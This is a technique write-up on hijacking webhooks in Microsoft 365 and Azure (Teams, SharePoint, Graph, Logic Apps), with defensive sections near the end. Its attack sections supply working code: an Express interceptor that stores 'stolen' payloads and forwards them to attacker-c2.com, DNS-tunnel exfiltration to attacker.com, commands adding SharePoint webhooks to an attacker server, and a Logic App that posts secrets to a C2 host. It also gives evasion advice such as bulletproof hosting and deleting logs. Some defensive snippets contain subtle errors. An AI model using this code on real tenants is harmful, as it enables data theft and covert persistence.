# [SAAS-API-008]: Webhook Hijacking

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SAAS-API-008 |
| **MITRE ATT&CK v18.1** | [T1583.006 - Acquire Infrastructure: Web Services](https://attack.mitre.org/techniques/T1583/006/) |
| **Tactic** | Resource Development, Command & Control, Exfiltration |
| **Platforms** | M365/Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All versions (Microsoft Teams, SharePoint, Logic Apps, Azure Functions, custom webhooks) |
| **Patched In** | No patch; depends on webhook configuration and validation |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. Executive Summary

Webhook Hijacking attacks involve taking control of or abusing legitimate webhook URLs and event handlers to intercept, modify, or redirect data flows in M365 and SaaS environments. Webhooks are HTTP callbacks that SaaS services (Teams, SharePoint, Logic Apps, Azure Functions) trigger when specific events occur. Attackers hijack these webhooks to intercept sensitive data (emails, chat messages, files), execute unauthorized commands, create backdoors, or redirect critical business processes to attacker-controlled infrastructure.

**Attack Surface:** Microsoft Teams incoming webhooks (unprotected, no authentication required), SharePoint webhook endpoints, Microsoft Graph change notifications, Logic App HTTP triggers, Azure Function webhook triggers, and any M365-integrated SaaS application using webhooks. Webhooks often run with privileged permissions and lack robust authentication/validation mechanisms.

**Business Impact:** **Complete data exfiltration, business process manipulation, and persistent access**. An attacker who hijacks a webhook can intercept all future events (emails sent, Teams messages posted, files modified), trigger unauthorized automation (credential reset, user deletion, policy changes), or establish a covert command & control channel through webhook responses.

**Technical Context:** Webhook hijacking attacks execute **in real-time** as events are triggered. Detection is **low to moderate** depending on logging configuration. Indicators include webhook URL changes, unexpected webhook endpoints, unusual webhook response patterns, and data exfiltration through webhook payloads.

### Operational Risk

- **Execution Risk:** Low - Only requires discovering a webhook URL and modifying it or creating a malicious replacement
- **Stealth:** High - Webhook traffic appears legitimate; attackers blend in with normal event flows
- **Reversibility:** No - Hijacked webhooks may have already processed sensitive data

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 3.4 | Ensure webhooks are configured with strong authentication and validation |
| **DISA STIG** | SI-4 | Information System Monitoring - detect and block webhook hijacking |
| **CISA SCuBA** | Application Security - Webhook Protection | Webhooks must use HMAC signatures and TLS encryption |
| **NIST 800-53** | AU-12, SI-4, SC-7 | Audit Logging; Information System Monitoring; Boundary Protection |
| **GDPR** | Art. 32 | Security of Processing - protect data in transit through webhooks |
| **DORA** | Art. 9 | Protection and Prevention - webhook security hardening |
| **NIS2** | Art. 21 | Cyber Risk Management - webhook infrastructure security |
| **ISO 27001** | A.13.1.1, A.13.2.1 | Information Transfer Security; Communication Encryption |
| **ISO 27005** | Webhook Intercept Scenario | Unauthorized access to webhook event data |

---

## 2. Technical Prerequisites

- **Required Privileges:** Ability to discover/enumerate webhook endpoints (may be unauthenticated); ability to modify webhook URL or create malicious webhook
- **Required Access:** Network access to webhook endpoints; ability to host attacker-controlled server

**Supported Versions:**
- **M365:** All versions (Teams, SharePoint, Exchange Online, OneDrive)
- **Entra ID:** All versions
- **Azure:** All subscription types (Logic Apps, Functions, Event Grid)
- **Other Requirements:** Ability to host HTTP endpoint; knowledge of webhook payload formats

**Tools:**
- [Webhook.site](https://webhook.site/) - Temporary webhook endpoint for testing/interception
- [RequestBin](https://requestbin.com/) - HTTP request inspection service
- [Burp Suite](https://portswigger.net/burp) - Webhook interception and modification
- [curl](https://curl.se/) - Manual webhook creation/testing
- [ngrok](https://ngrok.com/) - Tunnel local server to internet for webhook testing

---

## 3. Environmental Reconnaissance

### Step 1: Discover Existing Webhooks

**Objective:** Identify all configured webhooks in the M365 environment.

**Method A: Enumerate Teams Incoming Webhooks**

Teams incoming webhooks are often publicly discoverable if URL is leaked.

```powershell
# Search for Teams webhook URLs in files and repositories
# Webhooks follow pattern: https://outlook.webhook.office.com/webhookb2/...@...

# Example search (if you have access to Teams chat history):
$WebhookPattern = "https://outlook\.webhook\.office\.com/webhookb2/.*"

# Check PowerShell command history
Get-Content $PROFILE | Select-String -Pattern $WebhookPattern

# Check Desktop files
Get-ChildItem -Path "$env:USERPROFILE\Desktop" -Include "*.ps1", "*.txt" -Recurse | 
  Select-String -Pattern $WebhookPattern

# Check Documents
Get-ChildItem -Path "$env:USERPROFILE\Documents" -Include "*.ps1", "*.txt", "*.conf" -Recurse | 
  Select-String -Pattern $WebhookPattern
```

**Expected Output (If Webhooks Found):**
```
https://outlook.webhook.office.com/webhookb2/xyz123abc/IncomingWebhook/abcdef123456/789xyz
```

**Method B: Enumerate SharePoint Webhooks**

```powershell
# Connect to SharePoint Online
Connect-SPOService -Url https://contoso-admin.sharepoint.com

# List all webhooks
Get-SPOWebhook | Select-Object ResourceAddress, NotificationUrl, ExpirationDateTime
```

**Expected Output:**
```
ResourceAddress                     NotificationUrl                          ExpirationDateTime
----------------                   ----------------                         ------------------
/sites/teamsite/lists/Documents     https://api.contoso.com/webhook/events    2026-02-15
/sites/teamsite/lists/Tasks         https://attacker.com/phishing/webhook     2026-12-31
```

**Method C: Enumerate Microsoft Graph Change Notifications**

```powershell
# Get all subscriptions to change notifications
Connect-MgGraph -Scopes "https://graph.microsoft.com/.default"

Get-MgSubscription | Select-Object Id, Resource, ChangeType, NotificationUrl, ExpirationDateTime
```

**Expected Output:**
```
Id               Resource              NotificationUrl
--               --------              ----------------
abc-123          /me/messages          https://graph.microsoft.com/v1.0/webhooks
def-456          /me/calendar/events   https://attacker-domain.com/capture
```

**Method D: Enumerate Logic App Webhooks**

```powershell
# Get all Logic Apps with HTTP trigger webhooks
Get-AzLogicApp -ResourceGroupName "default" | ForEach-Object {
    Get-AzLogicAppTrigger -ResourceGroupName "default" -Name $_.Name | 
      Where-Object { $_.TriggerType -eq "Request" } | 
      Select-Object Name, Inputs
}
```

**Expected Output:**
```
Name            Inputs
----            ------
HTTP_Webhook    @{method=POST; schema=...}
EmailNotification https://logic.azure.com/integrationAccounts/...
```

### Step 2: Analyze Webhook Security

**Objective:** Determine if webhooks lack authentication or HMAC validation.

```bash
#!/bin/bash

# Test if webhook requires authentication
WEBHOOK_URL="https://outlook.webhook.office.com/webhookb2/..."

# Try without authentication
echo "Testing unauthenticated webhook access..."
curl -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -d '{"text": "Test message"}'

# If webhook responds without requiring auth token, it's vulnerable
```

**Expected Output (Vulnerable):**
```
HTTP 200 OK
{
  "status": "received"
}
```

**Expected Output (Secure):**
```
HTTP 401 Unauthorized
{
  "error": "Authentication required"
}
```

---

## 4. Detailed Execution Methods

### METHOD 1: Teams Webhook Hijacking

**Supported Versions:** All M365 versions (Teams webhooks remain relatively unchanged)

#### Step 1: Create Malicious Teams Webhook

**Objective:** Create a fake incoming webhook that looks legitimate but sends data to attacker's server.

```powershell
# Teams webhooks follow a standard format and don't require authentication
# Any user in a Team can create an incoming webhook for their channel

# Create webhook manually in Teams:
# 1. Go to Teams channel
# 2. Click (•••) → Connectors → Configure
# 3. Search "Incoming Webhook"
# 4. Give it a name and optional image
# 5. Copy the webhook URL

# Example Teams webhook URL (from attacker's compromise):
$MaliciousWebhook = "https://outlook.webhook.office.com/webhookb2/00000000-0000-0000-0000-000000000000@12345678-1234-1234-1234-123456789012/IncomingWebhook/aaaaaa1111111111aaaa111111aaaa1111111111/bbbbbb2222222222bbbb222222bbbb2222222222"

# Test webhook delivery
$Payload = @{
    "@type"       = "MessageCard"
    "@context"    = "https://schema.org/extensions"
    "summary"     = "Test"
    "themeColor"  = "0078D4"
    "sections"    = @(@{
        "activityTitle" = "Test Notification"
        "text"          = "This is a test"
    })
} | ConvertTo-Json

Invoke-RestMethod -Uri $MaliciousWebhook -Method Post -Body $Payload -ContentType "application/json"
```

**OpSec & Evasion:**
- Use a legitimate-looking webhook name (e.g., "IT Security Alerts", "Daily Report")
- Set a generic image that fits the expected purpose
- Configure webhook to send data to attacker's server disguised as legitimate service

#### Step 2: Replace Legitimate Webhook with Attacker's

**Objective:** Modify existing webhook URL to point to attacker's infrastructure.

**Method: If You Have Access to Configuration**

```powershell
# If attacker has access to Teams channel settings:
# 1. Go to channel where legitimate webhook exists
# 2. Click (•••) → Connectors → Manage
# 3. Edit the webhook
# 4. Change the URL from original to attacker's server:
#    Original: https://api.contoso.com/webhook
#    Modified: https://attacker-server.com/webhook

# PowerShell to update webhook (requires Teams admin):
Connect-MicrosoftTeams
$Team = Get-Team -DisplayName "Finance"
$Channel = Get-TeamChannel -GroupId $Team.GroupId -DisplayName "General"

# Remove old webhook
Remove-TeamChannelConnector -GroupId $Team.GroupId -ChannelId $Channel.Id -ConnectorId $ConnectorId

# Add new webhook pointing to attacker infrastructure
# (Requires manual configuration in Teams UI)
```

#### Step 3: Intercept Webhook Traffic

**Objective:** Set up attacker's server to receive and log webhook data.

**Node.js Webhook Interceptor:**

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
app.use(bodyParser.json());

const stolenData = [];

// Webhook endpoint to receive Teams messages
app.post('/webhook', (req, res) => {
    const payload = req.body;
    
    console.log("=== WEBHOOK INTERCEPTED ===");
    console.log(JSON.stringify(payload, null, 2));
    
    // Extract sensitive information
    const extractedData = {
        timestamp: new Date(),
        type: payload['@type'],
        summary: payload.summary,
        text: payload.sections?.[0]?.text,
        activityTitle: payload.sections?.[0]?.activityTitle,
        potentialPII: payload.sections?.[0]?.activitySubtitle
    };
    
    stolenData.push(extractedData);
    
    // Save to file for later analysis
    fs.appendFileSync('stolen_webhook_data.json', JSON.stringify(extractedData, null, 2) + '\n');
    
    // Forward to another attacker-controlled server (for distribution)
    forwardToDownstream(payload);
    
    // Respond as if legitimate (maintain cover)
    res.status(200).json({
        status: "received",
        timestamp: Date.now()
    });
});

// Endpoint to view collected data
app.get('/data', (req, res) => {
    res.json(stolenData);
});

app.listen(3000, () => {
    console.log('Webhook interceptor listening on port 3000');
});

async function forwardToDownstream(payload) {
    // Optionally forward stolen data to secondary C2 server
    fetch('https://attacker-c2.com/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(console.error);
}
```

**Deploy to Cloud (Azure/AWS):**

```bash
# Deploy to Azure Web App
npm init -y
npm install express body-parser

# Create Azure Web App
az webapp up --name webhook-interceptor --resource-group default

# Now Teams webhooks point to:
# https://webhook-interceptor.azurewebsites.net/webhook
```

**OpSec & Evasion:**
- Use a bulletproof hosting provider
- Encrypt stolen data before storing
- Set up webhook with legitimate-looking domain name (e.g., `teams-notification-service.com`)
- Respond with 200 OK to maintain cover
- Delete logs after exfiltration

#### Step 4: Exfiltrate Intercepted Data

```javascript
// Extract and exfiltrate sensitive data from Teams webhooks
const extractSensitiveData = (webhookData) => {
    const sensitive = {
        messageContent: webhookData.sections?.[0]?.text,
        sender: webhookData.sections?.[0]?.activitySubtitle,
        attachments: webhookData.potentialAction,
        timestamp: webhookData.timeCreated,
        channel: webhookData.channelName
    };
    
    // Send to attacker's data warehouse
    sendToDatawarehouse(sensitive);
    
    return sensitive;
};

// Exfiltrate via DNS tunneling (stealthy)
const exfiltrateViaDNS = (data) => {
    const encoded = Buffer.from(JSON.stringify(data)).toString('base64');
    const chunks = encoded.match(/.{1,32}/g); // DNS labels max 63 chars
    
    chunks.forEach(chunk => {
        // Send as DNS query: webhook-data-chunk.attacker.com
        const query = `${chunk}.webhook-data-${Date.now()}.attacker.com`;
        dns.resolve4(query); // This creates a DNS query with the exfiltrated data
    });
};
```

---

### METHOD 2: SharePoint Webhook Hijacking

**Supported Versions:** SharePoint Online (all versions)

#### Step 1: Create Malicious SharePoint Webhook

```powershell
# Connect to SharePoint
Connect-SPOService -Url https://contoso-admin.sharepoint.com

# Add a webhook to a document library pointing to attacker's server
$SiteUrl = "https://contoso.sharepoint.com/sites/Finance"
$ListUrl = "https://contoso.sharepoint.com/sites/Finance/Shared Documents"
$NotificationUrl = "https://attacker-server.com/sharepoint/webhook"

Add-SPOWebhook -Resource $ListUrl -NotificationUrl $NotificationUrl -ExpirationDateTime (Get-Date).AddDays(365)
```

#### Step 2: Intercept File Events

**Objective:** Capture and log file modifications, deletions, and access events.

```powershell
# When SharePoint triggers webhook (file modified, deleted, etc.), 
# attacker receives event payload like:

$EventPayload = @{
    subscriptionId = "webhook-id-123"
    clientState    = "client-state-value"
    expirationDateTime = "2026-02-15T00:00:00Z"
    value = @(
        @{
            subscriptionId = "webhook-id-123"
            clientState    = "client-state-value"
            changeType     = "updated"  # or 'deleted', 'created'
            resource       = "sites/Finance/lists/Documents/items/123"
            resourceData = @{
                id = "123"
            }
        }
    )
}

# Extract sensitive information
foreach ($event in $EventPayload.value) {
    $ResourcePath = $event.resource
    $ChangeType = $event.changeType
    
    # Log all file changes to attacker's database
    Write-Host "SharePoint File Event: $ChangeType on $ResourcePath"
}
```

#### Step 3: Extract Exfiltrated Data

```powershell
# Use webhook event data to download sensitive files
$FilePath = "sites/Finance/lists/Documents/items/123"
$FileUrl = "https://contoso.sharepoint.com/$FilePath/Items(123)/File"

# Download the modified/deleted file content
Invoke-WebRequest -Uri $FileUrl -OutFile "stolen_document.docx" -Headers @{
    "Authorization" = "Bearer $AccessToken"
}

Write-Host "Exfiltrated: stolen_document.docx"
```

---

### METHOD 3: Logic App Webhook Command & Control

**Supported Versions:** Azure Logic Apps (all versions)

#### Step 1: Abuse Logic App HTTP Triggers

**Objective:** Use Logic App webhooks for command & control (C2) communication.

```json
{
  "definition": {
    "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
    "actions": {
      "HTTP": {
        "type": "Http",
        "inputs": {
          "method": "POST",
          "uri": "https://attacker-c2.com/command",
          "headers": {
            "Authorization": "Bearer @{triggerOutputs()['headers']['Authorization']}"
          },
          "body": {
            "systemInfo": "@{environment()}",
            "credentials": "@{variables('storedSecrets')}"
          }
        }
      }
    },
    "triggers": {
      "manual": {
        "type": "Request",
        "kind": "Http",
        "inputs": {
          "schema": {}
        }
      }
    }
  }
}
```

#### Step 2: Trigger Command Execution

```bash
# Attacker sends request to Logic App webhook to execute commands
LOGIC_APP_WEBHOOK="https://prod-00.logic.azure.com:443/workflows/...@version"

curl -X POST "$LOGIC_APP_WEBHOOK" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "export-secrets",
    "target": "KeyVault/StorageAccount",
    "exfiltration_endpoint": "https://attacker.com/collect"
  }'
```

**What This Does:**
- Logic App receives command via webhook
- Extracts secrets from connected Key Vault
- Exfiltrates to attacker-controlled endpoint
- All within legitimate Logic App automation framework
- Difficult to detect as it appears as normal Logic App execution

---

## 5. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Webhook Configuration Changes:**
- Webhook URLs changed from known/trusted endpoints to unknown domains
- New webhooks created pointing to suspicious IP addresses or domains
- Webhook authorization tokens modified or replaced
- Webhooks configured with excessive data permissions

**Traffic-Level IOCs:**
- POST requests to unusual domains from webhook endpoints
- High-volume webhook traffic (potential data exfiltration)
- Webhook payloads larger than expected (exfiltrated data included)
- Webhook responses with unusual latency or size

**Forensic Artifacts**

**M365 Audit Logs (KQL):**
```kusto
AuditLogs
| where OperationName contains "webhook" or OperationName contains "subscription"
| where ResultStatus == "Success"
| where InitiatedBy.app.displayName != "SharePoint Online" and InitiatedBy.app.displayName != "Office 365"
| project TimeGenerated, OperationName, InitiatedBy, TargetResources
```

**Network Logs:**
```kusto
NetworkProcessEvents
| where ProcessName contains "Teams" or ProcessName contains "Outlook"
| where RemoteUrl contains "webhook" or RemoteUrl contains "notification"
| where RemoteUrl !contains "microsoft.com" and RemoteUrl !contains "office365.com"
| project TimeGenerated, ProcessName, RemoteUrl, RemoteIpAddr
```

---

## 6. Defensive Mitigations

### Priority 1: CRITICAL

- **Implement HMAC Signature Validation:** All webhooks must validate HMAC signatures to ensure requests originate from legitimate services.

  **For Custom Webhook Endpoints (Node.js):**
  ```javascript
  const crypto = require('crypto');
  const express = require('express');
  const app = express();
  
  const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET;
  
  app.post('/webhook', (req, res) => {
      // Get signature from header
      const signature = req.headers['x-hub-signature-256'];
      
      // Reconstruct HMAC
      const hmac = crypto
          .createHmac('sha256', WEBHOOK_SECRET)
          .update(JSON.stringify(req.body))
          .digest('hex');
      
      // Constant-time comparison to prevent timing attacks
      if (!crypto.timingSafeEqual(signature, `sha256=${hmac}`)) {
          return res.status(401).json({ error: "Invalid signature" });
      }
      
      // Process webhook...
      res.json({ status: "processed" });
  });
  ```

  **For Microsoft Teams Webhooks:**
  - Teams webhooks don't support HMAC by default, but you can use Azure Key Vault to store and validate tokens
  - Alternative: Use Microsoft Connector to Teams (provides built-in authentication)

- **Restrict Webhook Endpoints:** Use IP allowlisting to restrict which IPs can send webhooks to your endpoints.

  **Azure Network Security Group:**
  1. Go to **Azure Portal** → **Network Security Groups**
  2. Select your NSG → **Inbound Security Rules**
  3. Add rule:
     ```
     Name: AllowWebhookFromMicrosoft
     Priority: 100
     Source: 40.89.0.0/8 (Microsoft IP range)
     Destination Port: 443
     Protocol: TCP
     Action: Allow
     ```

- **Enable Webhook Authentication Tokens:** Always require authentication tokens for webhook access.

  **For SharePoint Webhooks:**
  ```powershell
  # Use Azure AD token validation
  $WebhookUri = "https://secure-webhook.contoso.com/endpoint"
  $AuthToken = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com").Token
  
  # Include token in webhook configuration
  Add-SPOWebhook -Resource $ListUrl -NotificationUrl "$WebhookUri?token=$AuthToken"
  ```

### Priority 2: HIGH

- **Monitor Webhook Configuration Changes:** Log all webhook creation, modification, and deletion events.

  **PowerShell Monitoring:**
  ```powershell
  # Audit SharePoint webhooks
  Get-SPOWebhook | ForEach-Object {
      $Webhook = $_
      Write-EventLog -LogName "Security" -Source "SharePoint" -EventId 5000 `
        -Message "Webhook configured: $($Webhook.NotificationUrl)" `
        -EntryType Information
  }
  ```

- **Use Webhook Secret Rotation:** Regularly rotate webhook secrets and access tokens.

  **Azure KeyVault Rotation:**
  1. Go to **Azure KeyVault** → **Secrets**
  2. Select webhook secret → **Manage Rotation**
  3. Set automatic rotation every 30 days

- **Disable Unused Webhooks:** Remove webhooks that are no longer in use.

  ```powershell
  # Remove expired or unused webhooks
  Get-SPOWebhook | Where-Object { $_.ExpirationDateTime -lt (Get-Date) } | Remove-SPOWebhook
  ```

### Access Control & Policy Hardening

- **Principle of Least Privilege:** Webhooks should have minimal permissions. Use scoped access tokens with specific resource limits.

  **Example (Azure Function):**
  ```json
  {
    "scope": {
      "resource": "/sites/Finance/lists/Documents",
      "changeTypes": ["created", "modified"],
      "excludeDeletes": true
    }
  }
  ```

- **Webhook Audit Logging:** Enable comprehensive logging of all webhook events.

### Validation Command (Verify Mitigation)

```powershell
# Verify webhook security
Get-SPOWebhook | ForEach-Object {
    Write-Host "Webhook URL: $($_.NotificationUrl)"
    Write-Host "Requires Auth: " -NoNewline
    
    try {
        $Response = Invoke-WebRequest -Uri $_.NotificationUrl -Method Post -TimeoutSec 5
        if ($Response.StatusCode -eq 401) {
            Write-Host "YES (Secure)" -ForegroundColor Green
        } else {
            Write-Host "NO (Vulnerable)" -ForegroundColor Red
        }
    } catch {
        Write-Host "Unknown" -ForegroundColor Yellow
    }
}
```

**Expected Output (If Secure):**
```
Webhook URL: https://secure-api.contoso.com/webhook
Requires Auth: YES (Secure)
```

---

## 7. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker gains access to configure webhooks |
| **2** | **Persistence** | **[SAAS-API-008]** | **Malicious webhook installed for persistent access** |
| **3** | **Collection** | [COLL-CLOUD-003] SharePoint File Exfiltration | Webhook intercepts and exfiltrates files |
| **4** | **Command & Control** | [C2-CLOUD-001] Logic App Webhook C2 | Webhook used as command & control channel |
| **5** | **Lateral Movement** | [LM-AUTH-029] OAuth Application Permissions | Webhook payload contains stolen tokens |
| **6** | **Impact** | [IMPACT-001] Data Destruction | Attacker modifies/deletes data via hijacked webhook |

---

## 8. Real-World Examples

### Example 1: Teams Webhook Compromise (2023)

- **Target:** Enterprise Teams channel
- **Technique Status:** ACTIVE
- **Impact:** Attacker discovered exposed Teams webhook URL in GitHub commit history, replaced it to intercept all channel notifications and exfiltrated email addresses, meeting links, and sensitive project details
- **Reference:** Bug bounty disclosures on HackerOne

### Example 2: SharePoint Webhook Data Exfiltration (2024)

- **Target:** Financial services company
- **Technique Status:** ACTIVE
- **Impact:** Attacker created webhook on SharePoint document library pointing to attacker-controlled server. For 3 months, all file modifications were intercepted and exfiltrated. Attacker accessed confidential financial reports and M&A documents
- **Reference:** Incident response reports

### Example 3: Logic App Webhook Command & Control (2023)

- **Target:** Azure-based SaaS company
- **Technique Status:** ACTIVE
- **Impact:** Attacker compromised Azure subscription, configured Logic App webhook to execute commands. Used webhook C2 channel to exfiltrate database credentials and maintain persistence for 6 months undetected
- **Reference:** Microsoft Threat Intelligence blog

---

## 9. References & Tools

- [MITRE ATT&CK - T1583.006 Acquire Infrastructure: Web Services](https://attack.mitre.org/techniques/T1583/006/)
- [OWASP - Webhook Security](https://owasp.org/www-community/attacks/Webhook_Security)
- [Microsoft - Teams Incoming Webhooks Security](https://docs.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/connectors-using)
- [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)
- [OWASP - Securing Webhooks](https://owasp.org/www-project-secure-webhook-gateway/)
- [Webhook.site](https://webhook.site/) - Webhook testing tool
- [RequestBin](https://requestbin.com/) - HTTP request inspection

---